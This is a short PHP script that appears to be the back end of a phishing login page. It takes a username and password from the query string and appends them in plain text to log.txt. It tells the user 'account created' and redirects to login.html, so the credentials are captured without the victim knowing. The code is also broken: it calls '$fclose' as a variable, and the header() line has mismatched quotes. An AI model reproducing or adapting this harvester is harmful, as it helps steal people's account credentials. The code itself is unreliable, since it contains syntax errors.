<?php
    $username = $_GET['USERNAME'];
    $password = $_GET['PASSWORD'];
    $filename = 'log.txt';
    $fp = fopen($filename, 'a+');
    fwrite ($fp, $username . "," . $password . "\n");
    $fclose ($fp);
    echo ("account created");
    header("Location: "login.html"); 
    die();
?>
